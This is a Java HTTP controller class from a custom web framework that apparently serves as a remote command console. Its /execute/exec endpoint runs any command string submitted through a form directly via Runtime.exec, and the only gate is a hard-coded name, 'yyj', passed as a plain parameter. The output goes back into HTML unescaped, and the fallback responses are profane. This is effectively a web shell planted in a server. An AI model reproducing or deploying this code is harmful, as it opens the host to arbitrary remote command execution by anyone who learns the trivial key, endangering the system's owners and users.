package top.yqingyu.common.nio$server.event$http.web.controller;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import top.yqingyu.common.nio$server.event$http.annotation.QyController;
import top.yqingyu.common.nio$server.event$http.compoment.HttpMethod;
import top.yqingyu.common.qydata.DataMap;

import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.Charset;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.FutureTask;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;

/**
 * @author YYJ
 * @version 1.0.0
 * @ClassName top.yqingyu.common.nio$server.event$http.web.controller.ExecuteCommand
 * @description
 * @createTime 2022年10月30日 23:10:00
 */

@QyController(path = "/execute")
public class ExecuteCommand {

    Logger log = LoggerFactory.getLogger(ExecuteCommand.class);

    @QyController(path = "/get", method = {HttpMethod.GET})
    String get(String name) {
        if ("yyj".equals(name))
            return "<br> " +
                    "<br> " +
                    "  <form action=\"/execute/exec\" method=\"post\">\n" +
                    "    <input type=\"text\" name=\"command\" value=\"command\">\n" +
                    "<br> " +
                    "    <input type=\"text\" name=\"name\" hidden=\"hidden\" value=\"" + name + "\">\n" +
                    "<br> " +
                    "    <input type=\"submit\" value=\"upper\">\n" +
                    "  </form>";

        return "fuck!!!!!!!!!!!!!!!!!!!!!!";
    }

    @QyController(path = "/exec")
    String execute(DataMap data) throws IOException {
        String name = data.getString("name");
        String command = data.getString("command");
        if ("yyj".equals(name)) {

            Process exec = null;
            InputStream inputStream = null;
            try {
                exec = Runtime.getRuntime().exec(command);
                inputStream = exec.getInputStream();
                InputStream finalInputStream = inputStream;
                FutureTask<byte[]> futureTask = new FutureTask<>(finalInputStream::readAllBytes);
                new Thread(futureTask).start();
                byte[] bytes = futureTask.get(5, TimeUnit.SECONDS);
                exec.destroy();
                String s = new String(bytes, Charset.forName(System.getProperty("sun.jnu.encoding")));

                log.info("execute\n\r {}", s);

                return
                        "<a href='/execute/get?name=yyj'>ok了</a> <br>" +
                                "<p>" + s +
                                "</p>";

            } catch (IOException e) {
                log.info("execute error : {}", e.getMessage());
            } catch (InterruptedException | ExecutionException | RuntimeException | TimeoutException e) {
                log.info("callback timeout", e);
            }
        }
        return "fuck!!!!!!!!!!!!!!!!!!!!!!";
    }
}
